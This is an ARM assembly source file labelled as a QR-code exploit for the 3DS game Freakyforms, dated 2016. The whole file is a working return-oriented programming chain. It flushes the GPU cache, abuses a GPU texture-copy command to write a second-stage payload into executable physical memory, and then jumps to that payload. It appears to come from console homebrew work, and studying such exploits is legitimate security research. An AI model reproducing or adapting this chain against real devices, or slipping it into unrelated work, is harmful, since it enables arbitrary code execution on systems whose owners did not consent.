/* freakyforms qr code exploit. */
/* plutoo 2016 */
#include "constants.h"

#define MAKE_PTR(addr) (addr - start + FILE_LOAD_ADDR)

start:
.word GADGET_R0                   // pop {r0, pc}
    .word FREAKYBIN_LOAD_ADDR+0x400   // r0
.word GADGET_R1                   // pop {r1, pc} 
    .word 0x1000                      // r1
    /* Make sure file contents aren't stuck in cache. */
.word GSP_FLUSH_DATA_CACHE+4      // gsp::FlushDataCache(..)
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
.word GSP_ENQUEUE_CMD_GADGET      // gsp::EnqueueGpuCommand(...)
    .word 4                           // sp_arg0  cmd_type=TEXTURE_COPY
    .word FREAKYBIN_LOAD_ADDR+0x400   // sp_arg1  src_ptr=file_buf+0x400
    .word PA_TO_GPU_ADDR(STAGE2_CODE_PA) // sp_arg2  dst_ptr=code_physaddr
    .word STAGE2_SIZE                 // sp_arg3  size=code_size
    .word 0                           // sp_arg4  in_dimensions=0
    .word 0                           // sp_arg5  out_dimensions=0
    .word 8                           // sp_arg6  flags=RAW_MEM_COPY
    .word 0                           // sp_arg7  not used
    .word GARBAGE                     // ...
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    .word GARBAGE                     // r7
    /* Sleep a bit until gpu has finished. */
.word GADGET_R0                   // pop {r0, pc}
    .word 0x1000000                   // r0
.word SVC_SLEEP_THREAD_GADGET     // svc::SleepThread(...)
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    /* Jump to stage2! */
.word STAGE2_CODE_VA

/* Force assembler error if payload becomes greater than 0x400. */
.org 0x400, 0x44
